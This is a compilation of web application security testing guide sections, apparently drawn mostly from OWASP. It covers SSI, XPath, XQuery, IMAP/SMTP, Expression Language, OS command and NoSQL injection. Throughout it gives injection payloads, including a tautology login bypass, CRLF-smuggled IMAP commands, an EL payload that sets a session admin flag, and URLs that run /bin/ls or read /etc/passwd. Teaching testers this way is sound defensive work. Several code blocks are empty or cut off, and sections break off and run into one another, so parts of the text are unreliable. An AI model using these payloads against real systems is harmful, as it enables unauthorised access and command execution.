        <h4>Web servers usually give developers the ability to add small pieces of dynamic code inside static HTML pages, without having to deal with full-fledged server-side or client-side languages. This feature is provided by <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_%28SSI%29_Injection">Server-Side Includes</a>(SSI).</h4>
        <p>Server-Side Includes are directives that the web server parses before serving the page to the user. They represent an alternative to writing CGI programs or embedding code using server-side scripting languages, when there&rsquo;s only need to perform very simple tasks. Common SSI implementations provide directives (commands) to include external files, to set and print web server CGI environment variables, or to execute external CGI scripts or system commands.</p>
        <p>SSI can lead to a Remote Command Execution (RCE), however most webservers have the <code class="language-plaintext highlighter-rouge">exec</code> directive disabled by default.</p>
        <p>This is a vulnerability very similar to a classical scripting language injection vulnerability. One mitigation is that the web server needs to be configured to allow SSI. On the other hand, SSI injection vulnerabilities are often simpler to exploit, since SSI directives are easy to understand and, at the same time, quite powerful, e.g., they can output the content of files and execute system commands.</p>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>
        <li>Identify SSI injection points.</li>
        <li>Assess the severity of the injection.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <p>To test for exploitable SSI, inject SSI directives as user input. If SSI are enabled and user input validation has not been properly implemented, the server will execute the directive. This is very similar to a classical scripting language injection vulnerability in that it occurs when user input is not properly validated and sanitized.</p>
        <p>First determine if the web server supports SSI directives. Often, the answer is yes, as SSI support is quite common. To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server">Fingerprint Web Server</a>). If you have access to the code, determine if SSI directives are used by searching through the webserver configuration files for specific keywords.</p>
        <p>Another way of verifying that SSI directives are enabled is by checking for pages with the <code class="language-plaintext highlighter-rouge">.shtml</code> extension, which is associated with SSI directives. The use of the <code class="language-plaintext highlighter-rouge">.shtml</code> extension is not mandatory, so not having found any <code class="language-plaintext highlighter-rouge">.shtml</code> files doesn&rsquo;t necessarily mean that the target is not vulnerable to SSI injection attacks.</p>
        <p>The next step is determining all the possible user input vectors and testing to see if the SSI injection is exploitable.</p>
        <p>First find all the pages where user input is allowed. Possible input vectors may also include headers and cookies. Determine how the input is stored and used, i.e if the input is returned as an error message or page element and if it was modified in some way. Access to the source code can help you to more easily determine where the input vectors are and how input is handled.</p>
        <p>Once you have a list of potential injection points, you may determine if the input is correctly validated. Ensure it is possible to inject characters used in SSI directives such as <code class="language-plaintext highlighter-rouge">&lt;!#=/."-&gt;</code> and <code class="language-plaintext highlighter-rouge">[a-zA-Z0-9]</code></p>
        <p>The below example returns the value of the variable. The <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection#references">references</a> section has helpful links with server-specific documentation to help you better assess a particular system.</p>

        </div>
        </div>
        <p>When using the <code class="language-plaintext highlighter-rouge">include</code> directive, if the supplied file is a CGI script, this directive will include the output of the CGI script. This directive may also be used to include the content of a file or list files in a directory:</p>
        <div class="language-html highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="c">&lt;!--#include virtual="FILENAME" --&gt;</span>
        </code></pre>
        </div>
        </div>
        <p>To return the output of a system command:</p>
        <div class="language-html highlighter-rouge">
        <div class="highlight">

        </code></pre>
        </div>
        </div>
        <p>If the application is vulnerable, the directive is injected and it would be interpreted by the server the next time the page is served.</p>
        <p>The SSI directives can also be injected in the HTTP headers, if the web application is using that data to build a dynamically generated page:</p>
        <div class="language-text highlighter-rouge">
        <div class="highlight">

        <h4>XPath is a language that has been designed and developed primarily to address parts of an XML document. In XPath injection testing, we test if it is possible to inject XPath syntax into a request interpreted by the application, allowing an attacker to execute user-controlled XPath queries. When successfully exploited, this vulnerability may allow an attacker to bypass authentication mechanisms or access information without proper authorization.</h4>
        <p>Web applications heavily use databases to store and access the data they need for their operations. Historically, relational databases have been by far the most common technology for data storage, but, in the last years, we are witnessing an increasing popularity for databases that organize data using the XML language. Just like relational databases are accessed via SQL language, XML databases use XPath as their standard query language.</p>
        <p>Since, from a conceptual point of view, XPath is very similar to SQL in its purpose and applications, an interesting result is that XPath injection attacks follow the same logic as <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> attacks. In some aspects, XPath is even more powerful than standard SQL, as its whole power is already present in its specifications, whereas a large number of the techniques that can be used in a SQL Injection attack depend on the characteristics of the SQL dialect used by the target database. This means that XPath injection attacks can be much more adaptable and ubiquitous. Another advantage of an XPath injection attack is that, unlike SQL, no ACLs are enforced, as our query can access every part of the XML document.</p>

        <p>The <a href="http://dl.packetstormsecurity.net/papers/bypass/Blind_XPath_Injection_20040518.pdf">XPath attack pattern was first published by Amit Klein</a> and is very similar to the usual SQL Injection. In order to get a first grasp of the problem, let&rsquo;s imagine a login page that manages the authentication to an application in which the user must enter their username and password. Let&rsquo;s assume that our database is represented by the following XML file:</p>
        <div class="language-xml highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>

                <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>

                <span class="nt">&lt;account&gt;</span>admin<span class="nt">&lt;/account&gt;</span>
            <span class="nt">&lt;/user&gt;</span>

                <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
                <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
                <span class="nt">&lt;account&gt;</span>guest<span class="nt">&lt;/account&gt;</span>
            <span class="nt">&lt;/user&gt;</span>
            <span class="nt">&lt;user&gt;</span>
                <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
                <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
                <span class="nt">&lt;account&gt;</span>guest<span class="nt">&lt;/account&gt;</span>
            <span class="nt">&lt;/user&gt;</span>
        <span class="nt">&lt;/users&gt;</span>
        </code></pre>
        </div>
        </div>
        <p>An XPath query that returns the account whose username is <code class="language-plaintext highlighter-rouge">gandalf</code> and the password is <code class="language-plaintext highlighter-rouge">!c3</code> would be the following:</p>
        <p><code class="language-plaintext highlighter-rouge">string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())</code></p>
        <p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
        <div class="language-text highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>Username: ' or '1' = '1
        Password: ' or '1' = '1
        </code></pre>
        </div>
        </div>
        <p>Looks quite familiar, doesn&rsquo;t it? Using these parameters, the query becomes:</p>
        <p><code class="language-plaintext highlighter-rouge">string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())</code></p>
        <p>As in a common SQL Injection attack, we have created a query that always evaluates to true, which means that the application will authenticate the user even if a username or a password have not been provided. And as in a common SQL Injection attack, with XPath injection, the first step is to insert a single quote (<code class="language-plaintext highlighter-rouge">'</code>) in the field to be tested, introducing a syntax error in the query, and to check whether the application returns an error message.</p>
        <p>If there is no knowledge about the XML data internal details and if the application does not provide useful error messages that help us reconstruct its internal logic, it is possible to perform a <a href="https://owasp.org/www-community/attacks/Blind_XPath_Injection">Blind XPath Injection</a> attack, whose goal is to reconstruct the whole data structure. The technique is similar to inference based SQL Injection, as the approach is to inject code that creates a query that returns one bit of information. <a href="https://owasp.org/www-community/attacks/Blind_XPath_Injection">Blind XPath Injection</a> is explained in more detail by Amit Klein in the referenced paper.</p>

	        <sl-details summary="XQuery Injection" open>
				<h4>XQuery Injection is a type of injection vulnerability that occurs when an attacker is able to inject malicious XQuery code into an application's query input, allowing them to manipulate the results of XML queries in ways that the developer did not intend. This vulnerability arises from improper validation or sanitization of user input that is passed to an XQuery processor, enabling attackers to execute arbitrary queries or access unauthorized data.</h4>

    <h2>Why is XQuery Injection Dangerous?</h2>
    <p>XQuery Injection can be very dangerous because it allows attackers to manipulate XML data, bypass security controls, or exfiltrate sensitive information. The risks of XQuery Injection include:</p>
    <ul>
        <li><strong>Unauthorized Data Access:</strong> Attackers can retrieve sensitive data from the database or server that they would not normally have access to.</li>
        <li><strong>Data Manipulation:</strong> Malicious XQuery injections can alter or delete data stored in XML format, causing data corruption or loss.</li>
        <li><strong>Privilege Escalation:</strong> Attackers may bypass access controls and gain unauthorized privileges, enabling them to escalate their attack.</li>
        <li><strong>Denial of Service (DoS):</strong> Injecting harmful queries can potentially overload the server or cause it to crash, disrupting service for legitimate users.</li>
    </ul>

    <h2>How XQuery Injection Works</h2>
    <p>XQuery is a query language used to extract and manipulate data stored in XML format. It is commonly used in applications that work with XML databases or document stores. XQuery injection occurs when user input is directly included in an XQuery query without proper sanitization, enabling the attacker to modify the query structure. This can allow them to:</p>
    <ul>
        <li>Access and retrieve unauthorized data by modifying the query logic.</li>
        <li>Inject new conditions, changing the intended behavior of the query.</li>
        <li>Execute arbitrary XQuery code on the database, potentially leading to system compromise.</li>
    </ul>

    <h2>Common Causes of XQuery Injection</h2>
    <p>Here are the most common causes of XQuery Injection vulnerabilities:</p>
    <ul>
        <li><strong>Improper Input Validation:</strong> The application fails to properly validate user input before including it in an XQuery query, allowing attackers to inject malicious code.</li>
        <li><strong>Dynamic Query Construction:</strong> If an application dynamically constructs XQuery queries by directly concatenating user input into the query string without sanitizing or parameterizing the input, this opens the door for injection attacks.</li>
        <li><strong>Lack of Prepared Statements:</strong> Failing to use parameterized queries or prepared statements in XQuery queries allows attackers to inject their own code into the query.</li>
        <li><strong>Insecure XML Processing:</strong> When XML data is not processed securely, such as failing to escape characters properly or neglecting to validate the input, XQuery Injection can occur.</li>
    </ul>

    <h2>Examples of XQuery Injection Vulnerabilities</h2>
    <p>Here are some examples of how XQuery Injection can manifest:</p>
    <ul>
        <li><strong>Injecting XPath Expressions:</strong> In some cases, attackers may inject an XPath expression that modifies the query's logic, allowing them to access data they shouldn't be able to see. For example, an attacker could add a condition to bypass authentication or to extract all user data from the database.</li>
        <li><strong>Altering Data Filters:</strong> If user input is used to filter XML data, an attacker can manipulate the query to retrieve data that should be restricted. For example, a simple filter like `WHERE username='user_input'` can be altered by injecting SQL-like expressions that retrieve all usernames or other sensitive data.</li>
        <li><strong>Injecting Code into Query Parameters:</strong> An attacker could provide input like `user_input=') or 1=1` that changes the structure of the query, resulting in unintended behavior such as returning all records or bypassing authentication mechanisms.</li>
    </ul>

    <h2>How to Prevent XQuery Injection</h2>
    <p>There are several best practices you can follow to prevent XQuery Injection vulnerabilities:</p>
    <ul>
        <li><strong>Validate and Sanitize Input:</strong> Ensure that all user input is properly validated and sanitized before being included in an XQuery query. This involves checking for invalid or unexpected characters and patterns, such as `<`, `>`, and `&`, which may alter query logic.</li>
        <li><strong>Use Parameterized Queries:</strong> Whenever possible, use parameterized queries or prepared statements to separate user input from the query logic. This ensures that input is treated as data, not executable code.</li>
        <li><strong>Escape User Input:</strong> Ensure that user input is properly escaped to prevent special characters from being interpreted as part of the XQuery syntax. This will mitigate the risk of code execution via injection.</li>
        <li><strong>Limit Privileges:</strong> Restrict the database privileges of the application so that even if an attacker successfully injects malicious XQuery, they cannot execute dangerous actions, such as modifying or deleting sensitive data.</li>
        <li><strong>Use Web Application Firewalls (WAF):</strong> A WAF can help detect and block XQuery Injection attempts by inspecting incoming requests and blocking those that contain suspicious query patterns.</li>
        <li><strong>Perform Regular Security Audits:</strong> Regularly audit your application's code and query handling mechanisms to identify potential vulnerabilities. Automated tools and manual penetration testing can help find and fix XQuery Injection flaws.</li>
    </ul>

    <h2>Testing for XQuery Injection</h2>
    <p>To test for XQuery Injection vulnerabilities, you can perform the following:</p>
    <ul>
        <li><strong>Input Manipulation:</strong> Attempt to inject XQuery-related syntax, such as `"` or `'`, into form fields, URL parameters, and other user inputs to see if the query logic is manipulated.</li>
        <li><strong>Use Known Payloads:</strong> Test using common XQuery Injection payloads, such as `')) or '1'='1'` or other characters that could potentially alter the query structure.</li>
        <li><strong>Observe Application Behavior:</strong> Monitor the application's responses when different inputs are provided. If the application behaves unexpectedly or returns unauthorized data, it may indicate an XQuery Injection vulnerability.</li>
        <li><strong>Automated Tools:</strong> Use security testing tools that can automatically detect XQuery Injection vulnerabilities, such as OWASP ZAP, Burp Suite, or custom scripts designed to test for XML-based vulnerabilities.</li>
    </ul>

    <h4>This threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.</h4>
    <p>The IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.</p>
    <p>An IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the front-end web servers. Therefore, mail server results may be more vulnerable to attacks by end users (see the scheme presented in Figure 1).</p>
    <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/Imap-smtp-injection.png" alt="IMAP SMTP Injection" /><br /> <em>Figure 4.7.10-1: Communication with the mail servers using the IMAP/SMTP Injection technique</em></p>
    <p>Figure 1 depicts the flow of traffic generally seen when using webmail technologies. Step 1 and 2 is the user interacting with the webmail client, whereas step 2 is the tester bypassing the webmail client and interacting with the back-end mail servers directly.</p>
    <p>This technique allows a wide variety of actions and attacks. The possibilities depend on the type and scope of injection and the mail server technology being tested.</p>
    <p>Some examples of attacks using the IMAP/SMTP Injection technique are:</p>
    <ul>
    <li>Exploitation of vulnerabilities in the IMAP/SMTP protocol</li>
    <li>Application restrictions evasion</li>
    <li>Anti-automation process evasion</li>
    <li>Information leaks</li>
    <li>Relay/SPAM</li>
    </ul>
    <h2 id="test-objectives">Test Objectives</h2>
    <ul>
    <li>Identify IMAP/SMTP injection points.</li>
    <li>Understand the data flow and deployment structure of the system.</li>
    <li>Assess the injection impacts.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <h3 id="identifying-vulnerable-parameters">Identifying Vulnerable Parameters</h3>
    <p>In order to detect vulnerable parameters, the tester has to analyze the application&rsquo;s ability in handling input. Input validation testing requires the tester to send bogus, or malicious, requests to the server and analyse the response. In a secure application, the response should be an error with some corresponding action telling the client that something has gone wrong. In a vulnerable application, the malicious request may be processed by the back-end application that will answer with a <code class="language-plaintext highlighter-rouge">HTTP 200 OK</code> response message.</p>
    <p>It is important to note that the requests being sent should match the technology being tested. Sending SQL injection strings for Microsoft SQL server when a MySQL server is being used will result in false positive responses. In this case, sending malicious IMAP commands is modus operandi since IMAP is the underlying protocol being tested.</p>
    <p>IMAP special parameters that should be used are:</p>
    <table>
    <thead>
    <tr>
    <th>On the IMAP server</th>
    <th>On the SMTP server</th>
    </tr>
    </thead>
    <tbody>
    <tr>
    <td>Authentication</td>
    <td>Emissor email</td>
    </tr>
    <tr>
    <td>operations with mail boxes (list, read, create, delete, rename)</td>
    <td>Destination email</td>
    </tr>
    <tr>
    <td>operations with messages (read, copy, move, delete)</td>
    <td>Subject</td>
    </tr>
    <tr>
    <td>Disconnection</td>
    <td>Message body</td>
    </tr>
    <tr>
    <td>&nbsp;</td>
    <td>Attached files</td>
    </tr>
    </tbody>
    </table>
    <p>In this example, the &ldquo;mailbox&rdquo; parameter is being tested by manipulating all requests with the parameter in:</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=46106&amp;startMessage=1</code></p>
    <p>The following examples can be used.</p>
    <ul>
    <li>Assign a null value to the parameter:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=&amp;passed_id=46106&amp;startMessage=1</code></p>
    <ul>
    <li>Substitute the value with a random value:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=NOTEXIST&amp;passed_id=46106&amp;startMessage=1</code></p>
    <ul>
    <li>Add other values to the parameter:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX PARAMETER2&amp;passed_id=46106&amp;startMessage=1</code></p>
    <ul>
    <li>Add non-standard special characters (i.e.: <code class="language-plaintext highlighter-rouge">\</code>, <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, <code class="language-plaintext highlighter-rouge">@</code>, <code class="language-plaintext highlighter-rouge">#</code>, <code class="language-plaintext highlighter-rouge">!</code>, <code class="language-plaintext highlighter-rouge">|</code>):</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX"&amp;passed_id=46106&amp;startMessage=1</code></p>
    <ul>
    <li>Eliminate the parameter:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?passed_id=46106&amp;startMessage=1</code></p>
    <p>The final result of the above testing gives the tester three possible situations: S1 - The application returns a error code/message S2 - The application does not return an error code/message, but it does not realize the requested operation S3 - The application does not return an error code/message and realizes the operation requested normally</p>
    <p>Situations S1 and S2 represent successful IMAP/SMTP injection.</p>
    <p>An attacker&rsquo;s aim is receiving the S1 response, as it is an indicator that the application is vulnerable to injection and further manipulation.</p>
    <p>Let&rsquo;s suppose that a user retrieves the email headers using the following HTTP request:</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/view_header.php?mailbox=INBOX&amp;passed_id=46105&amp;passed_ent_id=0</code></p>
    <p>An attacker might modify the value of the parameter INBOX by injecting the character <code class="language-plaintext highlighter-rouge">"</code> (%22 using URL encoding):</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/view_header.php?mailbox=INBOX%22&amp;passed_id=46105&amp;passed_ent_id=0</code></p>
    <p>In this case, the application answer may be:</p>
    <pre><code class="language-txt">ERROR: Bad or malformed request.
    Query: SELECT "INBOX""
    Server responded: Unexpected extra arguments to Select
    </code></pre>
    <p>The situation S2 is harder to test successfully. The tester needs to use blind command injection in order to determine if the server is vulnerable.</p>
    <p>On the other hand, the last situation (S3) is not relevant in this paragraph.</p>
    <blockquote>
    <p>List of vulnerable parameters</p>
    <ul>
    <li>Affected functionality</li>
    <li>Type of possible injection (IMAP/SMTP)</li>
    </ul>
    </blockquote>
    <h3 id="understanding-the-data-flow-and-deployment-structure-of-the-client">Understanding the Data Flow and Deployment Structure of the Client</h3>
    <p>After identifying all vulnerable parameters (for example, <code class="language-plaintext highlighter-rouge">passed_id</code>), the tester needs to determine what level of injection is possible and then design a testing plan to further exploit the application.</p>
    <p>In this test case, we have detected that the application&rsquo;s <code class="language-plaintext highlighter-rouge">passed_id</code> parameter is vulnerable and is used in the following request:</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=46225&amp;startMessage=1</code></p>
    <p>Using the following test case (providing an alphabetical value when a numerical value is required):</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=test&amp;startMessage=1</code></p>
    <p>will generate the following error message:</p>
    <pre><code class="language-txt">ERROR : Bad or malformed request.
    Query: FETCH test:test BODY[HEADER]
    Server responded: Error in IMAP command received by server.
    </code></pre>
    <p>In this example, the error message returned the name of the executed command and the corresponding parameters.</p>
    <p>In other situations, the error message (<code class="language-plaintext highlighter-rouge">not controlled</code> by the application) contains the name of the executed command, but reading the suitable <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection#references">RFC</a> allows the tester to understand what other possible commands can be executed.</p>
    <p>If the application does not return descriptive error messages, the tester needs to analyze the affected functionality to deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected IMAP command is <code class="language-plaintext highlighter-rouge">CREATE</code>. According to the RFC, the <code class="language-plaintext highlighter-rouge">CREATE</code> command accepts one parameter which specifies the name of the mailbox to create.</p>
    <blockquote>
    <p>List of IMAP/SMTP commands affected</p>
    <ul>
    <li>Type, value, and number of parameters expected by the affected IMAP/SMTP commands</li>
    </ul>
    </blockquote>
    <h3 id="imapsmtp-command-injection">IMAP/SMTP Command Injection</h3>
    <p>Once the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next stage is exploiting the functionality.</p>
    <p>This stage has two possible outcomes:</p>
    <ol>
    <li>The injection is possible in an unauthenticated state: the affected functionality does not require the user to be authenticated. The injected (IMAP) commands available are limited to: <code class="language-plaintext highlighter-rouge">CAPABILITY</code>, <code class="language-plaintext highlighter-rouge">NOOP</code>, <code class="language-plaintext highlighter-rouge">AUTHENTICATE</code>, <code class="language-plaintext highlighter-rouge">LOGIN</code>, and <code class="language-plaintext highlighter-rouge">LOGOUT</code>.</li>
    <li>The injection is only possible in an authenticated state: the successful exploitation requires the user to be fully authenticated before testing can continue.</li>
    </ol>
    <p>In any case, the typical structure of an IMAP/SMTP Injection is as follows:</p>
    <ul>
    <li>Header: ending of the expected command;</li>
    <li>Body: injection of the new command;</li>
    <li>Footer: beginning of the expected command.</li>
    </ul>
    <p>It is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be terminated with the CRLF (<code class="language-plaintext highlighter-rouge">%0d%0a</code>) sequence.</p>
    <p>Let&rsquo;s suppose that in the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection#identifying-vulnerable-parameters">Identifying vulnerable parameters</a> stage, the attacker detects that the parameter <code class="language-plaintext highlighter-rouge">message_id</code> in the following request is vulnerable:</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/read_email.php?message_id=4791</code></p>
    <p>Let&rsquo;s suppose also that the outcome of the analysis performed in the stage 2 (&ldquo;Understanding the data flow and deployment structure of the client&rdquo;) has identified the command and arguments associated with this parameter as:</p>
    <p><code class="language-plaintext highlighter-rouge">FETCH 4791 BODY[HEADER]</code></p>
    <p>In this scenario, the IMAP injection structure would be:</p>
    <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791</code></p>
    <p>Which would generate the following commands:</p>
    <div class="language-sql highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="o">????</span> <span class="k">FETCH</span> <span class="mi">4791</span> <span class="n">BODY</span><span class="p">[</span><span class="n">HEADER</span><span class="p">]</span>

        </blockquote>
        <h2 id="description">Description</h2>
        <p>Expression Language (EL) Injection happens when attacker controlled data enters an EL interpreter.</p>
        <p>With EL implementations prior to 2.2, attacker can recover sensitive server side information available through implicit objects. This includes model objects, beans, session scope, application scope, etc. The EL 2.2 spec allows method invocation, which permits an attacker to execute arbitrary code within context of the application. This can manipulate application functionality, expose sensitive data, and branch out into system code access&ndash; posing a risk of server compromise.</p>
        <p>A specific pattern exists in certain version of the Spring Framework, where Spring JSP tags will double resolve EL. In versions prior to 3.0.6, it is not possible to disable this functionality, and the pattern must be avoided.</p>
        <h2 id="risk-factors">Risk Factors</h2>
        <p>The likelihood of this issue is <strong>Medium</strong>, for the following reasons:</p>
        <ul>
        <li>Certain attack scenarios are not overly sophisticated, although require some skill.</li>
        <li>Automated tools may begin to pick up on the pattern, increasing the likelihood of discovery.</li>
        <li>Attackers are highly motivated to discover code execution vulnerabilities.</li>
        </ul>
        <p>The overall impact of this issue is <strong>High</strong>, for the following reasons:</p>
        <ul>
        <li>An attacker could modify and invoke functionality on the application server.</li>
        <li>Unauthorized access to data and functionality, as well as account hijacking and remote code execution.</li>
        <li>Confidentiality, and Integrity concerns from a successful attack.</li>

        </div>
        <p>Will result in the string literal &ldquo;INJECTION&rdquo; being passed to the message tag. The application should respond with an exception like:</p>

        <p>Accordingly, the attacker could submit methods within the EL like:</p>
        <pre><code class="language-&#96;">?msg=${pageContext.request.getSession().setAttribute("admin",true)}
        </code></pre>
        <p>If the container provided EL interpreter does not support static class methods (<code class="language-plaintext highlighter-rouge">java.lang.Runtime.getCurrentRuntime().exec()</code>), an attacker can use a URLClassLoader to load remote code.</p>

      <h4>OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.</h4>

      <p>When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol <code class="language-plaintext highlighter-rouge">|</code> onto the end of the filename.</p>
      <p>Example URL before alteration:</p>
      <p><code class="language-plaintext highlighter-rouge">http://sensitive/cgi-bin/userData.pl?doc=user1.txt</code></p>
      <p>Example URL modified:</p>
      <p><code class="language-plaintext highlighter-rouge">http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</code></p>
      <p>This will execute the command <code class="language-plaintext highlighter-rouge">/bin/ls</code>.</p>
      <p>Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. <code class="language-plaintext highlighter-rouge">%3B</code> is URL encoded and decodes to semicolon</p>
      <p>Example:</p>
      <p><code class="language-plaintext highlighter-rouge">http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</code></p>
      <h3 id="example">Example</h3>
      <p>Consider the case of an application that contains a set of documents that you can browse from the Internet.

        <h1 id="testing-for-nosql-injection">Testing for NoSQL Injection</h1>
        <h4>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren&rsquo;t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a <a href="https://en.wikipedia.org/wiki/Procedural_programming">procedural language</a>, rather than in the <a href="https://en.wikipedia.org/wiki/Declarative_programming">declarative SQL language</a>, the potential impacts are greater than traditional SQL injection.</h4>
        <p>NoSQL database calls are written in the application&rsquo;s programming language, a custom API call, or formatted according to a common convention (such as <code class="language-plaintext highlighter-rouge">XML</code>, <code class="language-plaintext highlighter-rouge">JSON</code>, <code class="language-plaintext highlighter-rouge">LINQ</code>, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as <code class="language-plaintext highlighter-rouge">&lt; &gt; &amp; ;</code> will not prevent attacks against a JSON API, where special characters include <code class="language-plaintext highlighter-rouge">/ { } :</code>.</p>
        <p>There are now over 150 <a href="http://nosql-database.org">NoSQL databases available</a> for use within an application, providing APIs in a variety of languages and relationship models. Each offers different features and restrictions. Because there is not a common language between them, example injection code will not apply across all NoSQL databases. For this reason, anyone testing for NoSQL injection attacks will need to familiarize themselves with the syntax, data model, and underlying programming language in order to craft specific tests.</p>
        <p>NoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.</p>
        <p>Additional timing attacks may be relevant to the lack of concurrency checks within a NoSQL database. These are not covered under injection testing. At the time of writing MongoDB is the most widely used NoSQL database, and so all examples will feature MongoDB APIs.</p>
        <h2 id="how-to-test">How to Test</h2>
        <h3 id="testing-for-nosql-injection-vulnerabilities-in-mongodb">Testing for NoSQL Injection Vulnerabilities in MongoDB</h3>
        <p>The MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON query assembly tool. However, according to MongoDB documentation - unserialized JSON and <a href="https://docs.mongodb.org/manual/faq/developers/#javascript">JavaScript expressions</a> are permitted in several alternative query parameters. The most commonly used API call allowing arbitrary JavaScript input is the <code class="language-plaintext highlighter-rouge">$where</code> operator.</p>
        <p>The MongoDB <code class="language-plaintext highlighter-rouge">$where</code> operator typically is used as a simple filter or check, as it is within SQL.</p>
        <p><code class="language-plaintext highlighter-rouge">db.myCollection.find( { $where: "this.credits</code><code class="language-plaintext highlighter-rouge"> </code><code class="language-plaintext highlighter-rouge">==</code><code class="language-plaintext highlighter-rouge"> </code><code class="language-plaintext highlighter-rouge">this.debits" } );</code></p>
        <p>Optionally JavaScript is also evaluated to allow more advanced conditions.</p>
        <p><code class="language-plaintext highlighter-rouge">db.myCollection.find( { $where: function() { return obj.credits - obj.debits &lt; 0; } } );</code></p>
        <h3 id="example-1">Example 1</h3>
        <p>If an attacker were able to manipulate the data passed into the <code class="language-plaintext highlighter-rouge">$where</code> operator, that attacker could include arbitrary JavaScript to be evaluated as part of the MongoDB query. An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization.</p>
        <p><code class="language-plaintext highlighter-rouge">db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits &lt; $userInput; } } );;</code></p>
        <p>As with testing other types of injection, one does not need to fully exploit the vulnerability to demonstrate a problem. By injecting special characters relevant to the target API language, and observing the results, a tester can determine if the application correctly sanitized the input. For example within MongoDB, if a string containing any of the following special characters were passed unsanitized, it would trigger a database error.</p>
        <p><code class="language-plaintext highlighter-rouge">' " \ ; { }</code></p>
        <p>With normal SQL injection, a similar vulnerability would allow an attacker to execute arbitrary SQL commands - exposing or manipulating data at will. However, because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code. For example, instead of just causing an error when testing, a full exploit would use the special characters to craft valid JavaScript.</p>
